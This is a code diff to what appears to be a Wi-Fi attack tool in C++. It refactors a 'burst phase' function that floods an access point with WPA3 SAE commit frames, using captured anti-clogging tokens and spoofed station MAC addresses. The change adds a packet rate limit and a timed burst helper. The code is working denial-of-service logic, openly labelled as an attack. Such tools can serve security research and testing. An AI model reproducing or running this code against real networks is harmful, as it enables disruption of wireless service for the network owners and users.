@@ -98,13 +98,13 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 						const int attack_time_sec, const dos_helpers::SAEPair &sae_params
 ){
 	PacketSender sender(iface);
-	long long sent = 0;
-	long long next_log = 0;
-	const auto end_time = steady_clock::now() + seconds(attack_time_sec);
+	// TODO get from config
+	constexpr size_t burst_size = 128;
+	constexpr size_t packets_per_second_limit = 500;
 
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
-
-	while(steady_clock::now() < end_time){
+	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, packets_per_second_limit,
+	[&]() -> optional<RadioTap>{
 		optional<ACMCookie> entry;
 		{
 			lock_guard lock(store.mtx);
@@ -119,29 +119,14 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 			this_thread::sleep_for(milliseconds(50));
 			auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)), sae_params);
 			sender.send(frame);
-			continue;
+			return nullopt;
 		}
 
 		auto burst_params = sae_params;
 		burst_params.token = entry->token;
-		auto frame = make_sae_commit(ap_mac, entry->sta_mac, burst_params);
-
-		constexpr size_t BURST_SIZE = 128;
-		for(size_t i = 0; i < BURST_SIZE; ++i){
-			sender.send(frame);
-			this_thread::sleep_for(milliseconds(2));
-		}
-		sent += BURST_SIZE;
-
-		if(sent >= next_log){
-			lock_guard l(store.mtx);
-			log(LogLevel::DEBUG, "Sent: {}, cookies remaining: {}", sent, store.queue.size());
-			next_log += 500;
-		}
-	}
-
+		return optional{make_sae_commit(ap_mac, entry->sta_mac, burst_params)};
+	});
 	store.stop.store(true); // signal capture thread to exit
-	log(LogLevel::INFO, "Burst done. Total packets sent: {}", sent);
 }
 
 void run_attack(RunStatus &rs){
